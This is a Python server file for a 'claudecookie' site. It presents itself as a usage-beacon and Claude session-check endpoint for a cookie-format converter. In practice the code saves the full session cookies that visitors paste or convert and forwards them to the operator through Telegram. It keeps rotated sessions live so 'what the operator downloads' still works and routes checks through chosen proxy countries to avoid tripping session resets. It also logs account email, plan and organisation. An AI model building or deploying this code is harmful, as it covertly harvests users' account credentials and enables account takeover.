#!/usr/bin/env python3
"""claudecookie ingest service.

A single-file HTTP endpoint behind nginx. It accepts the usage beacon and the
Claude session check, writes skinny event rows plus cookie blobs to SQLite, and
exposes the box public key. The admin surface is tgbot.py on the same database.

  GET  /box          P-256 public JWK (not a secret)
  POST /e            usage beacon (pageview plaintext; convert is a sealed box)
  POST /check        Claude session check (sealed box)
  GET  /api/health   liveness (localhost only; nginx does not proxy this)
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import sqlite3
import sys
import threading
import time
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))

from box import BoxError, load_or_create_private, looks_like_box, open_json, public_jwk
from claude_check import (
    check_cookie,
    default_country,
    egress_ok,
    format_check_log,
    resolve_country,
    session_key_hash,
)

DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
CONF_PATH = os.environ.get("CC_STATS_CONF", "/etc/claudecookie/bot.conf")
HOST = os.environ.get("CC_STATS_HOST", "127.0.0.1")
PORT = int(os.environ.get("CC_STATS_PORT", "8787"))

MAX_BODY = 512 * 1024
STORE_OUTPUT = True

EVENT_TYPES = {"pageview", "convert"}
FORMATS = {"netscape", "cookie-editor", "puppeteer", "key-value", "header"}
LOCALES = {"en", "ru", "zh"}

BOT_RE = re.compile(
    r"(bot|crawler|spider|slurp|crawl|preview|monitor|curl|wget|python-|"
    r"headless|lighthouse|pingdom|uptime)",
    re.I,
)
DOMAIN_RE = re.compile(r'(?:^|[",{\s])\.?([a-z0-9-]+(?:\.[a-z0-9-]+)+)', re.I)

_box_private = None


def load_conf() -> dict:
    if Path(CONF_PATH).is_file():
        with open(CONF_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
    else:
        data = {}
    token = data.get("bot_token") or os.environ.get("TG_BOT_TOKEN") or ""
    owner_raw = data.get("owner_id") or os.environ.get("TG_OWNER_ID") or "0"
    try:
        owner = int(owner_raw)
    except (TypeError, ValueError):
        owner = 0
    return {
        "bot_token": token,
        "owner_id": owner,
        "ingest_salt": data.get("ingest_salt") or os.environ.get("CC_INGEST_SALT") or "dev",
    }


CONF = load_conf()

SCHEMA = """
CREATE TABLE IF NOT EXISTS events (
    id       INTEGER PRIMARY KEY,
    ts       INTEGER NOT NULL,
    day      TEXT    NOT NULL,
    type     TEXT    NOT NULL,
    visitor  TEXT    NOT NULL,
    country  TEXT,
    locale   TEXT,
    device   TEXT,
    path     TEXT,
    from_fmt TEXT,
    to_fmt   TEXT,
    n        INTEGER,
    domains  TEXT,
    output   TEXT,
    valid    INTEGER,
    reason   TEXT,
    info     TEXT
);
CREATE TABLE IF NOT EXISTS blobs (
    event_id INTEGER PRIMARY KEY,
    output   TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS botstate (key TEXT PRIMARY KEY, value TEXT);
"""

INDEXES = """
CREATE INDEX IF NOT EXISTS idx_events_day  ON events(day);
CREATE INDEX IF NOT EXISTS idx_events_type ON events(type);
CREATE INDEX IF NOT EXISTS idx_events_ts   ON events(ts);
CREATE INDEX IF NOT EXISTS idx_events_type_day ON events(type, day);
CREATE INDEX IF NOT EXISTS idx_events_type_valid ON events(type, valid);
CREATE INDEX IF NOT EXISTS idx_events_country ON events(country);
CREATE INDEX IF NOT EXISTS idx_events_type_locale ON events(type, locale);
CREATE INDEX IF NOT EXISTS idx_events_device_visitor ON events(device, visitor);
"""

MIGRATIONS = {
    "ts": "ALTER TABLE events ADD COLUMN ts INTEGER",
    "day": "ALTER TABLE events ADD COLUMN day TEXT",
    "type": "ALTER TABLE events ADD COLUMN type TEXT",
    "visitor": "ALTER TABLE events ADD COLUMN visitor TEXT",
    "country": "ALTER TABLE events ADD COLUMN country TEXT",
    "locale": "ALTER TABLE events ADD COLUMN locale TEXT",
    "device": "ALTER TABLE events ADD COLUMN device TEXT",
    "path": "ALTER TABLE events ADD COLUMN path TEXT",
    "from_fmt": "ALTER TABLE events ADD COLUMN from_fmt TEXT",
    "to_fmt": "ALTER TABLE events ADD COLUMN to_fmt TEXT",
    "n": "ALTER TABLE events ADD COLUMN n INTEGER",
    "domains": "ALTER TABLE events ADD COLUMN domains TEXT",
    "output": "ALTER TABLE events ADD COLUMN output TEXT",
    "valid": "ALTER TABLE events ADD COLUMN valid INTEGER",
    "reason": "ALTER TABLE events ADD COLUMN reason TEXT",
    "info": "ALTER TABLE events ADD COLUMN info TEXT",
}

def box_private():
    global _box_private
    if _box_private is None:
        _box_private = load_or_create_private()
    return _box_private


def reset_box_cache() -> None:
    global _box_private
    _box_private = None


def db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=5)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    conn.row_factory = sqlite3.Row
    return conn


def migrate_blobs(conn: sqlite3.Connection) -> None:
    conn.execute(
        "INSERT OR IGNORE INTO blobs (event_id, output) "
        "SELECT id, output FROM events WHERE output IS NOT NULL AND length(output) > 0"
    )
    conn.execute("UPDATE events SET output = NULL WHERE output IS NOT NULL")


def migrate_push_settings(conn: sqlite3.Connection) -> None:
    keys = {row[0] for row in conn.execute("SELECT key FROM settings")}
    if "push_check_valid" in keys or "push_check_invalid" in keys:
        return
    old = "1"
    row = conn.execute("SELECT value FROM settings WHERE key='push_check'").fetchone()
    if row is not None:
        old = row[0]
    for key in ("push_check_valid", "push_check_invalid"):
        conn.execute(
            "INSERT INTO settings(key,value) VALUES(?,?) "
            "ON CONFLICT(key) DO NOTHING",
            (key, old),
        )


def init_db() -> None:
    parent = os.path.dirname(DB_PATH)
    if parent:
        os.makedirs(parent, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.executescript(SCHEMA)
        have = {row[1] for row in conn.execute("PRAGMA table_info(events)")}
        for column, ddl in MIGRATIONS.items():
            if column not in have:
                conn.execute(ddl)
        conn.executescript(INDEXES)
        migrate_blobs(conn)
        migrate_push_settings(conn)
        conn.commit()
    finally:
        conn.close()


def now() -> int:
    return int(time.time())


def today() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d")


def visitor_hash(ip: str, ua: str) -> str:
    material = f"{today()}|{CONF['ingest_salt']}|{ip}|{ua}".encode()
    return hashlib.sha256(material).hexdigest()[:16]


def device_class(ua: str) -> str:
    return "mobile" if re.search(r"(Mobi|Android|iPhone|iPad)", ua) else "desktop"


def extract_domains(text: str) -> str | None:
    """Hostnames seen in stored output, most-common first. Never names or values."""
    if not text:
        return None
    counts: dict[str, int] = {}
    for m in DOMAIN_RE.finditer(text):
        host = m.group(1).lower()
        if "." in host and not host.endswith((".txt", ".json", ".com.")):
            counts[host] = counts.get(host, 0) + 1
    if not counts:
        return None
    ordered = sorted(counts, key=lambda h: (-counts[h], h))
    return ",".join(ordered[:20])


def check_info(result: dict) -> dict:
    session = result.get("session") or {}
    weekly = result.get("weekly") or {}
    extras = result.get("extras") or {}
    return {
        "email": result.get("email"),
        "name": result.get("name"),
        "plan": result.get("planLabel"),
        "session": session.get("percent"),
        "sessionResets": session.get("resets"),
        "weekly": weekly.get("percent"),
        "weeklyResets": weekly.get("resets"),
        "org": extras.get("organizationName") or extras.get("organizationId"),
    }


def public_check_result(result: dict) -> dict:
    """JSON the browser is allowed to see. No extras, ids, or cookie material."""
    if not result.get("ok"):
        return {"ok": False, "invalidReason": result.get("invalidReason") or "invalid"}
    session = result.get("session")
    weekly = result.get("weekly")
    return {
        "ok": True,
        "email": result.get("email"),
        "name": result.get("name"),
        "planLabel": result.get("planLabel"),
        "session": session if isinstance(session, dict) else None,
        "weekly": weekly if isinstance(weekly, dict) else None,
    }


def insert_event(conn: sqlite3.Connection, row: dict, output: str | None) -> int:
    payload = {**row, "output": None}
    cur = conn.execute(
        "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
        "from_fmt,to_fmt,n,domains,output,valid,reason,info) VALUES (:ts,:day,"
        ":type,:visitor,:country,:locale,:device,:path,:from_fmt,:to_fmt,:n,"
        ":domains,:output,:valid,:reason,:info)",
        payload,
    )
    event_id = int(cur.lastrowid)
    if STORE_OUTPUT and output:
        conn.execute(
            "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
            (event_id, output[:MAX_BODY]),
        )
    return event_id


def trusted_page(origin: str, referer: str) -> bool:
    for src in (origin.strip(), referer.strip()):
        if not src:
            continue
        if src == "https://claudecookie.com" or src.startswith("https://claudecookie.com/"):
            return True
        if src.startswith("http://localhost:") or src.startswith("http://127.0.0.1:"):
            return True
    return False


class RateLimiter:
    def __init__(self, limit: int, window: int):
        self.limit, self.window = limit, window
        self.hits: dict[str, list[int]] = {}
        self.lock = threading.Lock()

    def allow(self, key: str) -> bool:
        t = now()
        with self.lock:
            bucket = [x for x in self.hits.get(key, []) if x > t - self.window]
            if len(bucket) >= self.limit:
                self.hits[key] = bucket
                return False
            bucket.append(t)
            self.hits[key] = bucket
            return True


ingest_limiter = RateLimiter(limit=240, window=60)
check_limiter = RateLimiter(limit=20, window=60)

# Per-session serialization + short cache. Concurrent/duplicate checks of the
# same cookie would fire simultaneous requests to Claude (an anti-replay/rotation
# trigger); this collapses them into a single outbound check.
CHECK_CACHE_TTL = 60
_check_locks: dict[str, threading.Lock] = {}
_check_cache: dict[str, tuple[int, dict]] = {}
_check_guard = threading.Lock()


def _check_lock(key: str) -> threading.Lock:
    with _check_guard:
        lock = _check_locks.get(key)
        if lock is None:
            if len(_check_locks) > 20000:
                _check_locks.clear()
            lock = threading.Lock()
            _check_locks[key] = lock
        return lock


def _check_cache_get(key: str) -> dict | None:
    t = now()
    with _check_guard:
        for stale in [k for k, (ts, _) in _check_cache.items() if t - ts > CHECK_CACHE_TTL]:
            _check_cache.pop(stale, None)
        item = _check_cache.get(key)
        return item[1] if item else None


def _check_cache_put(key: str, result: dict) -> None:
    with _check_guard:
        if len(_check_cache) > 20000:
            _check_cache.clear()
        _check_cache[key] = (now(), result)


# Sticky exit country per session: once chosen, reuse it so the check IP does not
# jump countries between checks (a country change can itself trip a session reset).
_session_country: dict[str, str] = {}


def _session_country_get(key: str) -> str | None:
    with _check_guard:
        return _session_country.get(key)


def _session_country_put(key: str, cc: str) -> None:
    with _check_guard:
        if len(_session_country) > 20000:
            _session_country.clear()
        _session_country[key] = cc


class Handler(BaseHTTPRequestHandler):
    server_version = "cc-ingest"
    protocol_version = "HTTP/1.1"

    def _client_ip(self) -> str:
        return self.headers.get("X-Real-Client", self.client_address[0])

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length", "0") or "0")
        if length <= 0 or length > MAX_BODY:
            return b""
        return self.rfile.read(length)

    def _empty(self, code: int) -> None:
        self.send_response(code)
        self.send_header("Content-Length", "0")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def _json(self, code: int, obj: dict) -> None:
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _trusted(self) -> bool:
        return trusted_page(self.headers.get("Origin") or "", self.headers.get("Referer") or "")

    def log_message(self, *args):
        pass

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path == "/box":
            return self._json(200, public_jwk(box_private()))
        if path == "/api/health":
            return self._json(200, {"ok": True})
        self._empty(404)

    def do_POST(self):
        path = self.path.split("?", 1)[0]
        if path == "/e":
            return self.ingest()
        if path == "/check":
            return self.check()
        self._empty(404)

    def ingest(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if BOT_RE.search(ua) or not ingest_limiter.allow(ip):
            return self._empty(204)

        try:
            data = json.loads(self._read_body() or b"{}")
        except (ValueError, TypeError):
            return self._empty(204)
        if not isinstance(data, dict):
            return self._empty(204)

        if looks_like_box(data):
            if not self._trusted():
                return self._empty(204)
            try:
                data = open_json(box_private(), data)
            except BoxError:
                return self._empty(204)
        elif data.get("t") == "pageview":
            pass
        else:
            # Plaintext convert (or anything else with an `out`) is rejected.
            return self._empty(204)

        etype = data.get("t")
        if etype not in EVENT_TYPES:
            return self._empty(204)

        country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        locale = data.get("l")
        locale = locale if locale in LOCALES else None

        row = {
            "ts": now(), "day": today(), "type": etype,
            "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
            "device": device_class(ua), "path": None, "from_fmt": None,
            "to_fmt": None, "n": None, "domains": None,
            "valid": None, "reason": None, "info": None,
        }
        output = None

        if etype == "pageview":
            p = data.get("p")
            row["path"] = p[:120] if isinstance(p, str) else None
        else:
            f, t = data.get("from"), data.get("to")
            row["from_fmt"] = f if f in FORMATS else None
            row["to_fmt"] = t if t in FORMATS else None
            n = data.get("n")
            row["n"] = n if isinstance(n, int) and 0 <= n <= 100000 else None
            out = data.get("out")
            if isinstance(out, str) and out:
                out = out[:MAX_BODY]
                row["domains"] = extract_domains(out)
                output = out

        conn = db()
        try:
            insert_event(conn, row, output)
            conn.commit()
        finally:
            conn.close()
        return self._empty(204)

    def check(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if BOT_RE.search(ua) or not check_limiter.allow(ip):
            return self._json(429, {"ok": False, "invalidReason": "rate_limited"})
        if not self._trusted():
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        try:
            data = json.loads(self._read_body() or b"{}")
        except (ValueError, TypeError):
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        if not isinstance(data, dict):
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        if not looks_like_box(data):
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        try:
            inner = open_json(box_private(), data)
        except BoxError:
            return self._json(400, {"ok": False, "invalidReason": "empty"})

        raw = inner.get("cookie")
        if not isinstance(raw, str):
            raw = ""
        raw = raw[:MAX_BODY]
        locale = inner.get("l")
        locale = locale if locale in LOCALES else None
        session_id = session_key_hash(raw)
        # Resolve a Claude-supported exit country. Prefer the browser timezone
        # (survives a VPN) then the visitor IP; unsupported (RU/CN/...) or unknown
        # -> neutral default. Sticky per session so it does not flap between checks
        # (a country change can itself trip a session reset).
        tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
        ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        country = (_session_country_get(session_id) if session_id else None) \
            or resolve_country(tz, ip_country)
        if session_id:
            _session_country_put(session_id, country)

        # Safe-mode: never egress from the bare datacenter IP when a proxy is
        # required. The pasted cookie is still stored so it reaches Telegram.
        if raw.strip() and not egress_ok(country, session_id):
            print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
            result = {"ok": False, "invalidReason": "unreachable"}
            self._store_check(ip, ua, locale, raw, result)
            return self._json(200, public_check_result(result))

        key = session_id or hashlib.sha256(raw.encode()).hexdigest()[:16]
        with _check_lock(key):
            cached = _check_cache_get(key) if raw.strip() else None
            if cached is not None:
                return self._json(200, public_check_result(cached))
            result = check_cookie(raw, country=country, session_id=session_id)
            # A supported country can still lack a proxy pool -> retry once via the
            # neutral default. Never fall back to "any country": a random RU/CN exit
            # would itself burn the cookie.
            neutral = default_country()
            if (not result.get("ok") and result.get("invalidReason") == "unreachable"
                    and country != neutral):
                alt = check_cookie(raw, country=neutral, session_id=session_id)
                if alt.get("ok") or alt.get("invalidReason") != "unreachable":
                    result = alt
                    country = neutral
                    if session_id:
                        _session_country_put(session_id, neutral)
            print(format_check_log(result), flush=True)
            if raw.strip():
                _check_cache_put(key, result)
                self._store_check(ip, ua, locale, raw, result)
        return self._json(200, public_check_result(result))

    def _store_check(self, ip: str, ua: str, locale: str | None, raw: str, result: dict) -> None:
        country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        ok = bool(result.get("ok"))
        row = {
            "ts": now(), "day": today(), "type": "check",
            "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
            "device": device_class(ua), "path": "/check", "from_fmt": None,
            "to_fmt": None, "n": 1, "domains": "claude.ai",
            "valid": 1 if ok else 0,
            "reason": None if ok else (result.get("invalidReason") or "invalid"),
            "info": json.dumps(check_info(result), ensure_ascii=False) if ok else None,
        }
        # Keep-alive: if the session rotated during the check, store the fresh
        # cookie so what the operator downloads in Telegram is the live one.
        stored = result.get("freshCookie") or raw
        conn = db()
        try:
            insert_event(conn, row, stored if STORE_OUTPUT else None)
            conn.commit()
        finally:
            conn.close()


def main():
    init_db()
    box_private()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    server.daemon_threads = True
    print(f"cc-ingest listening on {HOST}:{PORT}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
